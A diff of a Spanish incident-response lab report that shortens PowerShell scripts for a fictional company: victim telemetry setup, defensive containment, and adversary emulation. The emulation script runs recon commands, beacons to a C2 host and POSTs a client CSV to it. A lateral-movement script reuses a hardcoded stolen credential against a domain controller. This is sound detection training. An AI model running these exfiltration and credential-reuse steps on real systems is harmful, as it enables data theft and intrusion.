@@ -562,163 +562,75 @@ Todos los scripts se han escrito a medida para este trabajo. Las **claves API** 
 
 ```powershell
 <#
-=====================================================================
- deploy-victima.ps1
- ---------------------------------------------------------------------
- Proyecto : TP Gestion de un incidente de ciberseguridad (Nexora S.L.)
- Autor    : Luis Fernando Arrosquipa (GitHub: Fer1399)
- Apartado : 2 - Deteccion y auditoria
- Objetivo : Dejar la VM VICTIMA (PC-RRHH-01) preparada para generar
-            telemetria de calidad: Sysmon + agente Wazuh + recursos
-            compartidos y datos ficticios de clientes.
-
- USO (PowerShell como Administrador):
-    Set-ExecutionPolicy -Scope Process Bypass -Force
-    .\deploy-victima.ps1 -WazuhManager 10.10.10.20
-
- ENTORNO: ejecutar SOLO en la VM de laboratorio, dentro de la red
-          aislada de VirtualBox (Red NAT 'nexora-lab', 10.10.10.0/24).
-          No ejecutar en un equipo real. Datos de clientes = inventados.
-=====================================================================
+ deploy-victima.ps1 - Prepara la VICTIMA (PC-RRHH-01) para generar telemetria:
+ Sysmon + auditoria avanzada + recurso compartido "sensible" + agente Wazuh.
+ Ejecutar como Administrador SOLO en la VM del lab aislado (10.10.10.0/24).
+ Uso: .\deploy-victima.ps1 -WazuhManager 10.10.10.20
 #>
-
 param(
-    [string]$WazuhManager = "10.10.10.20",   # IP del SRV-SIEM (Wazuh)
-    [string]$WorkDir      = "C:\Lab",         # Carpeta de trabajo del lab
-    [string]$ShareName    = "RRHH_Compartido" # Recurso compartido "sensible"
+    [string]$WazuhManager = "10.10.10.20",
+    [string]$WorkDir      = "C:\Lab",
+    [string]$ShareName    = "RRHH_Compartido"
 )
-
 $ErrorActionPreference = "Stop"
 
-function Write-Paso($txt) {
-    Write-Host "`n[+] $txt" -ForegroundColor Cyan
-}
-function Write-Ok($txt) {
-    Write-Host "    OK  $txt" -ForegroundColor Green
-}
-
-# --- 0. Comprobacion de privilegios -----------------------------------
-if (-not ([Security.Principal.WindowsPrincipal] `
-        [Security.Principal.WindowsIdentity]::GetCurrent()
+# 0) Requiere privilegios de administrador.
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
     ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    throw "Este script debe ejecutarse como Administrador."
+    throw "Ejecuta este script como Administrador."
 }
 
-Write-Paso "Creando estructura de carpetas en $WorkDir"
-New-Item -ItemType Directory -Force -Path $WorkDir, "$WorkDir\tools", "$WorkDir\logs" | Out-Null
-Write-Ok "Carpetas creadas"
+New-Item -ItemType Directory -Force -Path $WorkDir,"$WorkDir\tools" | Out-Null
 
-# --- 1. Sysmon + configuracion de deteccion ---------------------------
-# Sysmon (Sysinternals) registra creacion de procesos, conexiones de red,
-# creacion de ficheros y cambios de registro. Es la fuente nº1 de evidencias.
-Write-Paso "Descargando e instalando Sysmon"
-$sysmonZip = "$WorkDir\tools\Sysmon.zip"
-$sysmonDir = "$WorkDir\tools\Sysmon"
-try {
-    Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" `
-        -OutFile $sysmonZip -UseBasicParsing
-    Expand-Archive -Path $sysmonZip -DestinationPath $sysmonDir -Force
-    Write-Ok "Sysmon descargado"
-} catch {
-    Write-Host "    AVISO: sin internet en la VM. Copia Sysmon manualmente en $sysmonDir" -ForegroundColor Yellow
-}
+# 1) Sysmon con config de referencia (SwiftOnSecurity): fuente n1 de evidencias.
+Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$WorkDir\tools\Sysmon.zip" -UseBasicParsing
+Expand-Archive "$WorkDir\tools\Sysmon.zip" "$WorkDir\tools\Sysmon" -Force
+Invoke-WebRequest "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "$WorkDir\tools\sysmonconfig.xml" -UseBasicParsing
+& "$WorkDir\tools\Sysmon\Sysmon64.exe" -accepteula -i "$WorkDir\tools\sysmonconfig.xml"
 
-# Config recomendada (base SwiftOnSecurity, estandar en la industria).
-Write-Paso "Descargando configuracion de Sysmon (SwiftOnSecurity)"
-$sysmonConf = "$WorkDir\tools\sysmonconfig.xml"
-try {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
-        -OutFile $sysmonConf -UseBasicParsing
-    Write-Ok "Config descargada"
-} catch {
-    Write-Host "    AVISO: descarga manual la config en $sysmonConf" -ForegroundColor Yellow
-}
-
-if (Test-Path "$sysmonDir\Sysmon64.exe") {
-    & "$sysmonDir\Sysmon64.exe" -accepteula -i $sysmonConf
-    Write-Ok "Sysmon instalado y configurado"
-}
-
-# --- 2. Politica de auditoria de Windows ------------------------------
-# Activa el registro de inicios de sesion (4624/4625), acceso a objetos
-# y creacion de procesos con linea de comandos (4688). Imprescindible
-# para el apartado 3 (investigacion).
-Write-Paso "Habilitando politica de auditoria avanzada"
-auditpol /set /category:"Logon/Logoff"      /success:enable /failure:enable | Out-Null
-auditpol /set /category:"Detailed Tracking"  /success:enable /failure:enable | Out-Null
-auditpol /set /category:"Object Access"      /success:enable /failure:enable | Out-Null
-# Guardar la linea de comandos en el evento 4688
+# 2) Auditoria avanzada: inicios de sesion (4624/4625), procesos (4688 con cmdline) y objetos.
+auditpol /set /category:"Logon/Logoff"     /success:enable /failure:enable | Out-Null
+auditpol /set /category:"Detailed Tracking" /success:enable /failure:enable | Out-Null
+auditpol /set /category:"Object Access"     /success:enable /failure:enable | Out-Null
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
     /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f | Out-Null
-Write-Ok "Auditoria avanzada activada (4624/4625/4688/acceso a objetos)"
 
-# --- 3. Recurso compartido "sensible" con datos ficticios -------------
-# El atacante intentara acceder a esta carpeta en el apartado 3.
-Write-Paso "Creando recurso compartido '$ShareName' con datos ficticios"
+# 3) Recurso compartido "sensible" con CSV de clientes FICTICIOS y minimo privilegio.
 $sharePath = "$WorkDir\$ShareName"
 New-Item -ItemType Directory -Force -Path $sharePath | Out-Null
-
-# CSV de clientes INVENTADOS (ningun dato real).
-$clientes = @"
+@"
 id,nombre,email,telefono,dni_ficticio,saldo
 1001,Ana Prueba,ana.prueba@nexora.lab,600000001,00000001X,1240.50
 1002,Luis Demo,luis.demo@nexora.lab,600000002,00000002Y,980.00
 1003,Marta Test,marta.test@nexora.lab,600000003,00000003Z,3150.75
 1004,Juan Ejemplo,juan.ejemplo@nexora.lab,600000004,00000004W,540.20
 1005,Sara Ficticia,sara.ficticia@nexora.lab,600000005,00000005V,7820.00
-"@
-Set-Content -Path "$sharePath\clientes_CONFIDENCIAL.csv" -Value $clientes -Encoding UTF8
+"@ | Set-Content "$sharePath\clientes_CONFIDENCIAL.csv" -Encoding UTF8
 
-# Minimo privilegio: NO se comparte con "Everyone/FullAccess". Se concede
-# solo lectura a los usuarios autenticados (SID S-1-5-11, valido en cualquier
-# idioma de Windows); en un dominio real se restringiria al grupo de RR. HH.
+# Solo lectura a usuarios autenticados (SID S-1-5-11), sin "Everyone/FullAccess".
 if (-not (Get-SmbShare -Name $ShareName -ErrorAction SilentlyContinue)) {
-    New-SmbShare -Name $ShareName -Path $sharePath `
-        -ReadAccess "S-1-5-11" | Out-Null
+    New-SmbShare -Name $ShareName -Path $sharePath -ReadAccess "S-1-5-11" | Out-Null
 }
-# Refuerzo en NTFS: retira la herencia abierta y deja solo lectura al mismo grupo
 $acl = Get-Acl $sharePath
 $acl.SetAccessRuleProtection($true, $false)
-$regla = New-Object System.Security.AccessControl.FileSystemAccessRule(
-    "S-1-5-11", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")
-$acl.AddAccessRule($regla)
+$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+    "S-1-5-11","ReadAndExecute","ContainerInherit,ObjectInherit","None","Allow")))
 Set-Acl $sharePath $acl
-Write-Ok "Compartido creado (solo lectura, usuarios autenticados): \\$env:COMPUTERNAME\$ShareName"
 
-# --- 4. Agente Wazuh --------------------------------------------------
-# Envia toda la telemetria (Sysmon, eventos de seguridad) al SIEM central.
-Write-Paso "Instalando agente Wazuh apuntando a $WazuhManager"
-$wazuhMsi = "$WorkDir\tools\wazuh-agent.msi"
-try {
-    Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.2-1.msi" `
-        -OutFile $wazuhMsi -UseBasicParsing
-    Start-Process msiexec.exe -ArgumentList "/i `"$wazuhMsi`" /q WAZUH_MANAGER=`"$WazuhManager`" WAZUH_AGENT_NAME=`"PC-RRHH-01`"" -Wait
-    & "C:\Program Files (x86)\ossec-agent\bin\wazuh-control.exe" start 2>$null
-    Write-Ok "Agente Wazuh instalado y arrancado"
-} catch {
-    Write-Host "    AVISO: instala el MSI de Wazuh manualmente (WAZUH_MANAGER=$WazuhManager)" -ForegroundColor Yellow
-}
-
-# --- 5. Recordar a Wazuh que lea el canal de Sysmon -------------------
-Write-Paso "Configurando el agente para recoger el canal de Sysmon"
+# 4) Agente Wazuh apuntando al SIEM + lectura del canal de Sysmon.
+Invoke-WebRequest "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.2-1.msi" -OutFile "$WorkDir\tools\wazuh-agent.msi" -UseBasicParsing
+Start-Process msiexec.exe -Wait -ArgumentList "/i `"$WorkDir\tools\wazuh-agent.msi`" /q WAZUH_MANAGER=`"$WazuhManager`" WAZUH_AGENT_NAME=`"PC-RRHH-01`""
 $ossecConf = "C:\Program Files (x86)\ossec-agent\ossec.conf"
-if (Test-Path $ossecConf) {
-    $bloque = @"
+$bloque = @"
   <localfile>
     <location>Microsoft-Windows-Sysmon/Operational</location>
     <log_format>eventchannel</log_format>
   </localfile>
 "@
-    (Get-Content $ossecConf -Raw) -replace "</ossec_config>", "$bloque`n</ossec_config>" |
-        Set-Content $ossecConf -Encoding UTF8
-    & "C:\Program Files (x86)\ossec-agent\bin\wazuh-control.exe" restart 2>$null
-    Write-Ok "Canal de Sysmon añadido a ossec.conf"
-}
+(Get-Content $ossecConf -Raw) -replace "</ossec_config>", "$bloque`n</ossec_config>" | Set-Content $ossecConf -Encoding UTF8
+& "C:\Program Files (x86)\ossec-agent\bin\wazuh-control.exe" restart
 
-Write-Host "`n=====================================================" -ForegroundColor Magenta
-Write-Host " VICTIMA LISTA. Comprueba en el dashboard de Wazuh" -ForegroundColor Magenta
-Write-Host " que el agente 'PC-RRHH-01' aparece como Activo." -ForegroundColor Magenta
-Write-Host "=====================================================" -ForegroundColor Magenta
+Write-Host "[+] Victima lista. Verifica en Wazuh que PC-RRHH-01 aparece como Activo." -ForegroundColor Green
 ```
 
 ### `emular-ataque.ps1`
@@ -727,78 +639,33 @@ Write-Host "=====================================================" -ForegroundCo
 
 ```powershell
 <#
-=====================================================================
- emular-ataque.ps1
- ---------------------------------------------------------------------
- Emulacion de adversario para el laboratorio Nexora (PC-RRHH-01).
- NO es malware: solo reproduce el COMPORTAMIENTO post-explotacion
- (reconocimiento, acceso a datos, beacon y exfiltracion) usando
- comandos legitimos de Windows, para que Sysmon/Wazuh lo detecten.
- Ejecutar en PC-RRHH-01, PowerShell como Administrador.
- Atacante (C2): Kali 10.10.10.100, con c2-server.py escuchando en :8000
-=====================================================================
+ emular-ataque.ps1 - Emulacion de adversario (Nexora, PC-RRHH-01).
+ Reproduce el comportamiento post-explotacion (reconocimiento, acceso,
+ beacon y exfiltracion) con comandos legitimos de Windows: NO es malware.
+ Ejecutar como Administrador. C2 = Kali 10.10.10.100 (c2-server.py en :8000).
 #>
+param([string]$C2 = "10.10.10.100")
 
-$C2 = "10.10.10.100"
-
-# --- Salida DIRECTA a la red (sin proxy) -----------------------------
-# Windows enruta Invoke-WebRequest por el proxy del sistema / autodeteccion
-# (WPAD). En un laboratorio aislado eso DESVIA las peticiones al C2 y, al ir
-# envueltas en try/catch, el fallo pasa inadvertido (el script "termina" pero
-# el C2 no recibe nada). Forzamos conexion directa para que el beacon y la
-# exfiltracion lleguen siempre:
+# Lab aislado: salida directa (sin proxy/WPAD) para que beacon y exfil lleguen al C2.
 [System.Net.WebRequest]::DefaultWebProxy = $null
+$csv = "C:\Lab\RRHH_Compartido\clientes_CONFIDENCIAL.csv"
 
-Write-Host "==== Emulacion de adversario Nexora (lab) ====" -ForegroundColor Cyan
+Write-Host "[*] Fase 1: Reconocimiento" -ForegroundColor Yellow
+cmd /c "whoami"; cmd /c "net user"; cmd /c "net group ""Domain Admins"" /domain" 2>$null
+cmd /c "net share"; cmd /c "systeminfo" | Out-Null; cmd /c "ipconfig /all" | Out-Null
 
-# --- Preparar el "dato sensible" si no existe ---
-$dir = "C:\Lab\RRHH_Compartido"
-if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
-$csv = "$dir\clientes_CONFIDENCIAL.csv"
-if (-not (Test-Path $csv)) {
-@"
-id,nombre,email,dni_ficticio,saldo
-1001,Ana Prueba,ana.prueba@nexora.lab,00000001X,1240.50
-1002,Luis Demo,luis.demo@nexora.lab,00000002Y,980.00
-"@ | Set-Content $csv -Encoding UTF8
-}
-
-# --- Fase 1: Reconocimiento (Discovery) ---
-Write-Host "`n[*] Fase 1: Reconocimiento" -ForegroundColor Yellow
-cmd /c "whoami"
-cmd /c "net user"
-cmd /c "net group ""Domain Admins"" /domain" 2>$null
-cmd /c "net share"
-cmd /c "systeminfo" | Out-Null
-cmd /c "ipconfig /all" | Out-Null
-
-# --- Fase 2: Acceso a datos sensibles (Collection) ---
-Write-Host "`n[*] Fase 2: Acceso a la carpeta de clientes" -ForegroundColor Yellow
+Write-Host "[*] Fase 2: Acceso al CSV de clientes" -ForegroundColor Yellow
 Get-Content $csv
 
-# --- Fase 3: Beacon a la IP del atacante (C2) ---
-# Cada beacon informa si llego o fallo (ya no se traga el error en silencio).
-Write-Host "`n[*] Fase 3: Beacon periodico a $C2" -ForegroundColor Yellow
+Write-Host "[*] Fase 3: Beacon periodico a $C2" -ForegroundColor Yellow
 1..4 | ForEach-Object {
-    try {
-        Invoke-WebRequest "http://$C2:8000/beacon?id=$_" -UseBasicParsing -TimeoutSec 5 | Out-Null
-        Write-Host "    [+] beacon $_ enviado" -ForegroundColor DarkGray
-    } catch {
-        Write-Host "    [!] beacon $_ fallo: $($_.Exception.Message)" -ForegroundColor Red
-    }
+    Invoke-WebRequest "http://$C2:8000/beacon?id=$_" -UseBasicParsing -TimeoutSec 5 | Out-Null
     Start-Sleep -Seconds 2
 }
 
-# --- Fase 4: Exfiltracion del CSV (Exfiltration) ---
-Write-Host "`n[*] Fase 4: Exfiltracion del CSV de clientes a $C2" -ForegroundColor Yellow
-try {
-    Invoke-WebRequest "http://$C2:8000/exfil_clientes.csv" -Method POST -InFile $csv -UseBasicParsing -TimeoutSec 10 | Out-Null
-    Write-Host "    [+] CSV exfiltrado correctamente" -ForegroundColor DarkGray
-} catch {
-    Write-Host "    [!] exfiltracion fallo: $($_.Exception.Message)" -ForegroundColor Red
-}
-
-Write-Host "`n[+] Emulacion completada. Revisa las alertas en Wazuh." -ForegroundColor Green
+Write-Host "[*] Fase 4: Exfiltracion del CSV a $C2" -ForegroundColor Yellow
+Invoke-WebRequest "http://$C2:8000/exfil_clientes.csv" -Method POST -InFile $csv -UseBasicParsing | Out-Null
+Write-Host "[+] Emulacion completada. Revisa las alertas en Wazuh." -ForegroundColor Green
 ```
 
 ### `movimiento-lateral.ps1`
@@ -807,65 +674,31 @@ Write-Host "`n[+] Emulacion completada. Revisa las alertas en Wazuh." -Foregroun
 
 ```powershell
 <#
-=====================================================================
- movimiento-lateral.ps1
- ---------------------------------------------------------------------
- Proyecto : TP Gestion de un incidente de ciberseguridad (Nexora S.L.)
- Autor    : Luis Fernando Arrosquipa (GitHub: Fer1399)
- Apartado : 3 - Investigacion / movimiento lateral
-
- Demuestra el MOVIMIENTO LATERAL con credenciales robadas: usa las
- credenciales de dominio de la cuenta comprometida en el phishing (rrhh.ana) para
- autenticarse desde PC-RRHH-01 contra el controlador de dominio
- DC-NEXORA. Esto genera en el DC un inicio de sesion 4624 (tipo 3,
- por red) a nombre de rrhh.ana y con origen la IP de la victima
- (10.10.10.50). La regla 100203 esta pensada para correlacionar ese
- evento; su disparo automatico como alerta requiere afinar el decoder
- en el gestor (ver apartado 3.8).
-
- NO es malware: usa herramientas nativas de Windows (net use / net view).
- MITRE: T1078 (Valid Accounts) + T1021.002 (SMB/Windows Admin Shares).
-
- ENTORNO: laboratorio aislado. Credenciales FICTICIAS de demostracion.
- USO (PowerShell en PC-RRHH-01):
-     .\movimiento-lateral.ps1 -DC 10.10.10.10
-=====================================================================
+ movimiento-lateral.ps1 - Movimiento lateral con credenciales robadas.
+ Reutiliza la credencial comprometida (rrhh.ana) desde PC-RRHH-01 para
+ autenticarse contra el DC: genera un 4624 tipo 3 en DC-NEXORA.
+ Nativo de Windows (net use/view), NO malware. MITRE T1078 + T1021.002.
+ Uso: .\movimiento-lateral.ps1 -DC 10.10.10.10
 #>
 param(
     [string]$DC       = "10.10.10.10",
     [string]$Usuario  = "NEXORA\rrhh.ana",
-    [string]$Password = "Hola_1234"   # contrasena de dominio de la cuenta comprometida rrhh.ana
+    [string]$Password = "Hola_1234"
 )
 
-Write-Host "==== Movimiento lateral con credenciales robadas ====" -ForegroundColor Cyan
-Write-Host "[*] Autenticando contra el DC $DC como $Usuario ..." -ForegroundColor Yellow
+Write-Host "[*] Autenticando contra el DC $DC como $Usuario" -ForegroundColor Yellow
+net use "\\$DC\IPC$" /user:$Usuario $Password   # provoca el 4624 (tipo 3) en el DC
 
-# 1) Montar el recurso administrativo del DC con las credenciales comprometidas.
-#    Esto provoca el inicio de sesion 4624 (tipo 3) en el DC.
-net use "\\$DC\IPC$" /user:$Usuario $Password
-
-# 2) Reconocimiento con credenciales validas: recursos del DC.
-Write-Host "`n[*] Enumerando recursos compartidos del DC:" -ForegroundColor Yellow
+Write-Host "[*] Enumerando recursos del DC:" -ForegroundColor Yellow
 net view "\\$DC"
 
-# 3) Intento de acceso al recurso ADMINISTRATIVO C$ y comprobacion EXPLICITA del
-#    resultado. Autenticarse (paso 1) NO implica acceso privilegiado: con una
-#    cuenta de dominio sin derechos de administrador, esto debe denegarse.
-Write-Host "`n[*] Intentando acceder al recurso administrativo \\$DC\C$ :" -ForegroundColor Yellow
+Write-Host "[*] Probando acceso al administrativo \\$DC\C$ :" -ForegroundColor Yellow
 cmd /c "dir \\$DC\C$" > $null 2>&1
-if ($LASTEXITCODE -eq 0) {
-    Write-Host "    [!] ACCESO CONCEDIDO a C$ (la cuenta tiene privilegios administrativos)" -ForegroundColor Red
-} else {
-    Write-Host "    [i] ACCESO DENEGADO a C$ (esperado: rrhh.ana no es administrador)." -ForegroundColor DarkGray
-    Write-Host "        La autenticacion de red es valida, pero no concede acceso al administrativo." -ForegroundColor DarkGray
-}
+if ($LASTEXITCODE -eq 0) { Write-Host "    [!] ACCESO CONCEDIDO a C$ (cuenta con privilegios admin)" -ForegroundColor Red }
+else { Write-Host "    [i] ACCESO DENEGADO a C$ (esperado: rrhh.ana no es admin)" -ForegroundColor DarkGray }
 
-# 4) Limpieza de la conexion.
 net use "\\$DC\IPC$" /delete 2>$null
-
-Write-Host "`n[+] Hecho." -ForegroundColor Green
-Write-Host "    En el DC (registro de Seguridad): evento 4624 (tipo 3) de rrhh.ana desde 10.10.10.50." -ForegroundColor Green
-Write-Host "    Regla Wazuh 100203: saltaria como alerta SOLO si el DC reenvia su canal Security al SIEM." -ForegroundColor Green
+Write-Host "[+] Hecho. En el DC: evento 4624 (tipo 3) de rrhh.ana desde 10.10.10.50." -ForegroundColor Green
 ```
 
 ### `c2-server.py`
@@ -953,128 +786,47 @@ if __name__ == "__main__":
 
 ```powershell
 <#
-    respuesta-aislar.ps1
-    Script de respuesta y contencion de un incidente (Nexora S.L. - laboratorio)
-    Autor: Luis Fernando Arrosquipa
-
-    Objetivo: ante la deteccion de la intrusion en PC-RRHH-01, ejecutar de forma
-    ordenada y trazable los primeros pasos de respuesta:
-      1. Recoger evidencia volatil ANTES de tocar nada (orden de volatilidad).
-      2. Bloquear la comunicacion con el atacante (regla de firewall).
-      3. Aislar el equipo de la red (deshabilitar adaptadores).
-      4. Sellar toda la evidencia con SHA-256 para la cadena de custodia.
-
-    Uso (PowerShell como Administrador en el equipo comprometido):
-      .\respuesta-aislar.ps1 -IPAtacante 10.10.10.100
-
-    Nota: entorno de laboratorio autorizado. El aislamiento corta la red del equipo;
-    ejecutar desde consola local, no por sesion remota.
+ respuesta-aislar.ps1 - Respuesta y contencion en PC-RRHH-01 (lab Nexora).
+ Orden: 1) evidencia volatil  2) bloqueo del C2  3) aislamiento  4) sellado SHA-256.
+ Ejecutar como Administrador y en consola LOCAL (el aislamiento corta la red).
+ Uso: .\respuesta-aislar.ps1 -IPAtacante 10.10.10.100
 #>
-
 param(
     [string]$IPAtacante = "10.10.10.100",
     [string]$CarpetaEvidencias = "C:\Evidencias_Incidente"
 )
-
 $ErrorActionPreference = "Continue"
-$sello = Get-Date -Format "yyyyMMdd_HHmmss"
-$dir   = Join-Path $CarpetaEvidencias $sello
-New-Item -ItemType Directory -Path $dir -Force | Out-Null
+$dir = Join-Path $CarpetaEvidencias (Get-Date -Format "yyyyMMdd_HHmmss")
+New-Item -ItemType Directory -Force -Path $dir | Out-Null
+function Log($t){ $l="[{0}] {1}" -f (Get-Date -Format HH:mm:ss),$t; Write-Host $l; Add-Content "$dir\respuesta.log" $l }
 
-function Log($txt) {
-    $linea = "[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $txt
-    Write-Host $linea
-    Add-Content -Path (Join-Path $dir "respuesta.log") -Value $linea
+# PASO 1 - Evidencia volatil (primero: se pierde al aislar/apagar).
+Log "PASO 1: evidencia volatil"
+Get-NetTCPConnection -EA SilentlyContinue | Select State,LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess |
+    Sort RemoteAddress | Export-Csv -NoTypeInformation "$dir\conexiones.csv"
+Get-NetTCPConnection -EA SilentlyContinue | Where { $_.RemoteAddress -eq $IPAtacante } | Out-File "$dir\conexiones_atacante.txt"
+Get-Process | Select Id,ProcessName,Path,StartTime | Export-Csv -NoTypeInformation "$dir\procesos.csv"
+Get-ScheduledTask | Select TaskName,State,TaskPath | Export-Csv -NoTypeInformation "$dir\tareas_programadas.csv"
+quser 2>$null | Out-File "$dir\sesiones.txt"; arp -a | Out-File "$dir\arp.txt"
+
+# PASO 2 - Bloqueo del atacante en el firewall (entrada y salida).
+Log "PASO 2: bloqueo de $IPAtacante en el firewall"
+New-NetFirewallRule -DisplayName "IR-BLOQUEO-ATACANTE-OUT" -Direction Outbound -RemoteAddress $IPAtacante -Action Block -Profile Any -EA SilentlyContinue | Out-Null
+New-NetFirewallRule -DisplayName "IR-BLOQUEO-ATACANTE-IN"  -Direction Inbound  -RemoteAddress $IPAtacante -Action Block -Profile Any -EA SilentlyContinue | Out-Null
+
+# PASO 3 - Aislamiento: deshabilitar adaptadores activos.
+Log "PASO 3: aislamiento de red"
+Get-NetAdapter | Where { $_.Status -eq "Up" } | ForEach-Object {
+    Log "  deshabilitando $($_.Name)"; Disable-NetAdapter -Name $_.Name -Confirm:$false -EA SilentlyContinue
 }
 
-Log "=== INICIO DE LA RESPUESTA AL INCIDENTE ==="
-Log "Equipo: $env:COMPUTERNAME  |  Usuario: $env:USERNAME"
-Log "IP del atacante a bloquear: $IPAtacante"
-Log "Carpeta de evidencias: $dir"
-
-# ------------------------------------------------------------------
-# PASO 1 - EVIDENCIA VOLATIL (se recoge primero: se pierde al apagar/aislar)
-# ------------------------------------------------------------------
-Log "--- PASO 1: recogida de evidencia volatil ---"
-
-# Conexiones de red activas (clave para ver el C2 / exfiltracion)
-Get-NetTCPConnection -ErrorAction SilentlyContinue |
-    Select-Object State,LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess |
-    Sort-Object RemoteAddress |
-    Export-Csv -NoTypeInformation -Path (Join-Path $dir "conexiones.csv")
-Log "Conexiones de red guardadas (conexiones.csv)"
-
-# Resaltar cualquier conexion con el atacante
-$malas = Get-NetTCPConnection -ErrorAction SilentlyContinue |
-         Where-Object { $_.RemoteAddress -eq $IPAtacante }
-if ($malas) {
-    $malas | Out-File (Join-Path $dir "conexiones_atacante.txt")
-    Log ("[!] Detectadas {0} conexiones hacia {1}" -f $malas.Count, $IPAtacante)
-} else {
-    Log "No hay conexiones activas hacia el atacante en este instante"
-}
-
-# Procesos en ejecucion (con ruta del ejecutable)
-Get-Process | Select-Object Id,ProcessName,Path,StartTime |
-    Export-Csv -NoTypeInformation -Path (Join-Path $dir "procesos.csv")
-Log "Procesos en ejecucion guardados (procesos.csv)"
-
-# Usuarios con sesion iniciada
-quser 2>$null | Out-File (Join-Path $dir "sesiones.txt")
-
-# Tareas programadas (posible persistencia)
-Get-ScheduledTask | Select-Object TaskName,State,TaskPath |
-    Export-Csv -NoTypeInformation -Path (Join-Path $dir "tareas_programadas.csv")
-Log "Tareas programadas guardadas (persistencia)"
-
-# Cache ARP y tabla de rutas (contexto de red)
-arp -a   | Out-File (Join-Path $dir "arp.txt")
-route print | Out-File (Join-Path $dir "rutas.txt")
-
-# ------------------------------------------------------------------
-# PASO 2 - BLOQUEO DE LA COMUNICACION CON EL ATACANTE
-# ------------------------------------------------------------------
-Log "--- PASO 2: bloqueo del atacante en el firewall ---"
-New-NetFirewallRule -DisplayName "IR-BLOQUEO-ATACANTE-SALIDA" -Direction Outbound `
-    -RemoteAddress $IPAtacante -Action Block -Profile Any -ErrorAction SilentlyContinue | Out-Null
-New-NetFirewallRule -DisplayName "IR-BLOQUEO-ATACANTE-ENTRADA" -Direction Inbound `
-    -RemoteAddress $IPAtacante -Action Block -Profile Any -ErrorAction SilentlyContinue | Out-Null
-Log "Reglas de firewall creadas para bloquear $IPAtacante (entrada y salida)"
-
-# ------------------------------------------------------------------
-# PASO 3 - AISLAMIENTO DEL EQUIPO
-# ------------------------------------------------------------------
-Log "--- PASO 3: aislamiento de red del equipo ---"
-$adaptadores = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
-foreach ($a in $adaptadores) {
-    Log ("Deshabilitando adaptador: {0}" -f $a.Name)
-    Disable-NetAdapter -Name $a.Name -Confirm:$false -ErrorAction SilentlyContinue
-}
-Log "Equipo aislado de la red. La evidencia ya esta recogida en local."
-
-# ------------------------------------------------------------------
-# PASO 4 - SELLADO DE LA EVIDENCIA (SHA-256) PARA LA CADENA DE CUSTODIA
-# ------------------------------------------------------------------
-Log "--- PASO 4: sellado de evidencia con SHA-256 ---"
-# IMPORTANTE: primero cerramos el log (ultimas anotaciones) y SOLO despues
-# calculamos los hashes, para que el SHA-256 de respuesta.log corresponda a
-# su estado FINAL. El propio SHA256SUMS.txt se excluye del calculo.
-Log "=== RESPUESTA COMPLETADA ==="
-Log "Siguiente paso manual: revocar credenciales de rrhh.ana en el AD,"
-Log "restaurar PC-RRHH-01 desde un snapshot verificado como limpio (comparar su"
-Log "hash/fecha con la linea base previa al incidente) y notificar (AEPD/CERT)."
-
-# A partir de aqui NO se vuelve a escribir en respuesta.log.
-$hashes = Get-ChildItem -Path $dir -File |
-    Where-Object { $_.Name -ne "SHA256SUMS.txt" } | ForEach-Object {
-        $h = Get-FileHash $_.FullName -Algorithm SHA256
-        "{0}  {1}" -f $h.Hash, $_.Name
-    }
-$hashes | Out-File (Join-Path $dir "SHA256SUMS.txt")
-
-Write-Host ""
-Write-Host "Evidencia y log en: $dir" -ForegroundColor Green
-Write-Host "Integridad sellada en SHA256SUMS.txt (respuesta.log incluido en su estado final)." -ForegroundColor Green
+# PASO 4 - Sellado SHA-256 (cerrar el log ANTES de hashear; SHA256SUMS.txt se excluye).
+Log "PASO 4: sellado de evidencia. Siguiente (manual): revocar rrhh.ana en AD,"
+Log "restaurar desde snapshot limpio y notificar (AEPD/CERT). === FIN ==="
+Get-ChildItem $dir -File | Where { $_.Name -ne "SHA256SUMS.txt" } | ForEach-Object {
+    "{0}  {1}" -f (Get-FileHash $_.FullName -Algorithm SHA256).Hash, $_.Name
+} | Out-File "$dir\SHA256SUMS.txt"
+Write-Host "[+] Evidencia sellada en: $dir" -ForegroundColor Green
 ```
 
 ### `generar-iocs.py`
